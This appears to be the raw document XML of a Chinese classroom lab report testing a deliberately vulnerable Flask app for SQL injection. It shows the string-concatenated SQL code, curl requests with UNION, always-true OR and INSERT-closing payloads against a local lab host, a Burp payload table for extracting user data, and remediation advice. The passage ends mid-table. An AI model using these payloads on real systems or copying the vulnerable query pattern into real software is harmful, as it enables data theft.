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CC0000"/>
          <w:sz w:val="52"/>
        </w:rPr>
        <w:t>Flask 用户管理系统</w:t>
        <w:br/>
        <w:t>SQL 注入漏洞检测报告</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>—— 课堂作业 ——</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>项目名称：flask-user-management</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>完成日期：2026-07-08</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>测试目标：搜索功能 SQL 注入 &amp; 注册功能 SQL 注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>漏洞类型：UNION 注入、OR 万能条件注入、INSERT 注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>GitHub 仓库：github.com/nobody848/flask-user-management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before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>一、实验概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>二、漏洞背景</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>三、POC 1：UNION 注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    3.1  攻击原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    3.2  复现步骤</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    3.3  生成 SQL 分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>四、POC 2：OR 万能条件注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    4.1  攻击原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    4.2  复现步骤</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    4.3  生成 SQL 分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>五、POC 3：注册功能 SQL 注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    5.1  攻击原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    5.2  复现步骤</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    5.3  生成 SQL 分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>六、Burp Suite 测试方法</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>七、漏洞原因分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>八、修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>九、实验总结</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>一、实验概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>本实验对一个基于 Python Flask 框架开发的用户管理系统进行 SQL 注入漏洞检测。该系统提供用户注册、登录、信息搜索等基本功能，其搜索功能和注册功能均使用Python f-string 拼接 SQL 语句，存在严重的 SQL 注入漏洞。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>本次检测目标：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>验证搜索功能 UNION 注入漏洞的存在</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>验证搜索功能 OR 万能条件注入漏洞的存在</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>验证注册功能 INSERT 注入漏洞的存在</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>分析漏洞成因，提出修复方案</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>实验环境：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Kali Linux (靶机) / Windows (客户端)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Web 框架</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Python Flask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SQLite 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>测试工具</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>curl / Burp Suite</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>靶机地址</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>http://192.168.152.128:5000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>二、漏洞背景</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>SQL 注入（SQL Injection）是 Web 应用中最常见的安全漏洞之一，在 OWASP Top 10（2021）中排名第一。其成因是应用程序将用户输入的数据直接拼接到 SQL 语句中执行，攻击者通过构造特殊输入改变 SQL 语句的语义，从而实现越权数据访问、数据篡改甚至数据删除。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>本应用存在漏洞的代码位置：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>搜索功能：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>keyword = request.args.get("keyword", "")</w:t>
        <w:br/>
        <w:t>sql = f"SELECT id, username, email, phone FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"</w:t>
        <w:br/>
        <w:t>cursor.execute(sql)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>注册功能：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>username = request.form.get("username", "")</w:t>
        <w:br/>
        <w:t>password = request.form.get("password", "")</w:t>
        <w:br/>
        <w:t>sql = f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')"</w:t>
        <w:br/>
        <w:t>cursor.execute(sql)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>问题本质：</w:t>
      </w:r>
      <w:r>
        <w:t>用户输入未经任何过滤或转义，直接通过 f-string 拼接到 SQL 语句中，攻击者可构造特殊输入改变 SQL 语义。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>三、POC 1：UNION 注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.1  攻击原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>UNION 是 SQL 中的集合操作符，用于合并两个 SELECT 查询的结果集。攻击者通过闭合原始查询，使用 UNION 关键字附加自己的 SELECT 语句，从而在正常搜索结果中插入任意数据。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>关键限制：UNION 前后的 SELECT 语句必须返回相同数量的列。原查询 SELECT * FROM users 返回 4 列（id, username, email, phone），因此 UNION SELECT 也必须返回 4 列。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2  复现步骤</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>第一步：登录应用获取 Session Cookie</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl http://127.0.0.1:5000/login -d "username=admin&amp;password=admin123" -c /tmp/cookies.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>第二步：发送 UNION 注入请求</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl "http://127.0.0.1:5000/search?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27inj@x.com%27,%27138%27--" -b /tmp/cookies.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.3  生成 SQL 分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>注入后生成的 SQL：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>SELECT * FROM users</w:t>
        <w:br/>
        <w:t>WHERE username LIKE '%' UNION SELECT 1,'inj','inj@x.com','138'--%'</w:t>
        <w:br/>
        <w:t xml:space="preserve">      OR email LIKE '%' UNION SELECT 1,'inj','inj@x.com','138'--%'</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>UNION SELECT 将伪造数据 (1, inj, inj@x.com, 138) 合并到正常查询结果中。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修复前</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>修复后</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>注入 Payload</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>原查询结果 + 伪造数据</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>参数化查询阻止</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>UNION 数据</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>id=1, inj, inj@x.com, 138</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>无注入数据返回</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>效果</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>注入成功</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>被防御</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>四、POC 2：OR 万能条件注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1  攻击原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>OR 注入利用 SQL 中 OR 运算符的特性。攻击者输入 ' OR '1'='1 使 WHERE 子句变为恒真条件，由于 '1'='1' 永远为真，整个 WHERE 条件恒为 TRUE，数据库返回所有用户数据。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2  复现步骤</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>登录后发送 OR 注入请求：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl "http://127.0.0.1:5000/search?keyword=%27%20OR%20%271%27%3D%271" -b /tmp/cookies.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.3  生成 SQL 分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>注入后生成的 SQL：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>SELECT * FROM users</w:t>
        <w:br/>
        <w:t>WHERE username LIKE '%' OR '1'='1%'</w:t>
        <w:br/>
        <w:t xml:space="preserve">      OR email LIKE '%' OR '1'='1%'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>由于 '1'='1' 为永真条件，WHERE 子句整体永远为 TRUE，查询返回 users 表中的全部记录。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>预期输出（泄漏全部用户数据）：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用户名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>邮箱</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>手机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admin@example.com</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>13800138000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alice</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>alice@example.com</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>13900139001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hacker</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>h@x.com</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>123</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>五、POC 3：注册功能 SQL 注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1  攻击原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>注册功能同样使用 f-string 拼接 SQL。攻击者在用户名字段中构造闭合语句，使用 ')' 闭合 VALUES 列表，使用 -- 注释掉后续 SQL，从而完全控制写入数据库的字段值。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2  复现步骤</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl http://127.0.0.1:5000/register \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d "username=hacker, 'pass', 'h@x.com', '123')--&amp;password=irrelevant"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.3  生成 SQL 分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>注入后生成的 SQL：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>INSERT INTO users (username, password, email, phone)</w:t>
        <w:br/>
        <w:t>VALUES ('hacker', 'pass', 'h@x.com', '123')--', 'irrelevant', '', '')</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>-- 是 SQL 中的注释符，将后续的内容全部注释掉。攻击者通过闭合 VALUES 列表完全控制了所有数据库字段。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实际写入值</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>username</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>hacker（攻击者控制）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>password/email/phone</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pass / h@x.com / 123（攻击者控制）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>六、Burp Suite 测试方法</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>除了使用 curl 命令行外，也可以使用 Burp Suite 进行图形化测试：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>配置步骤</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1. 启动 Burp Suite，配置浏览器代理为 127.0.0.1:8080</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2. 登录应用后，拦截 GET /search?keyword=admin 请求</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>3. 右键发送到 Repeater</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>4. 在 Repeater 中修改 keyword 参数值进行测试</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>测试 Payload 列表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Payload</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>预期效果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admin' OR '1'='1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>返回所有用户</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>万能条件绕过</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>' UNION SELECT 1,2,3,4--</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>返回数字列</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>探测列数</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>' UNION SELECT 1,username,email,phone FROM users--</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>用户名和邮箱</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>提取数据</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>观察要点</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>正常响应：只显示匹配搜索关键词的用户</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>注入成功：响应中出现额外数据或全部用户</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>列数不匹配：SQLite 报错提示列数不一致</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>七、漏洞原因分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.1  直接原因：f-string 拼接 SQL</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>应用程序使用 Python 的 f-string 将用户输入直接嵌入 SQL 语句中，而未使用参数化查询或任何转义处理。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.2  根本原因：缺乏安全开发意识</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>未对用户输入做任何验证或过滤</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>未使用参数化查询或 ORM 框架</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>未遵循最小权限原则</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>无应用层防护措施</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.3  漏洞危害评估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威胁类型</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>危害描述</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>机密性</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>攻击者可窃取全部用户数据（用户名、密码、邮箱、手机号）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>完整性</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
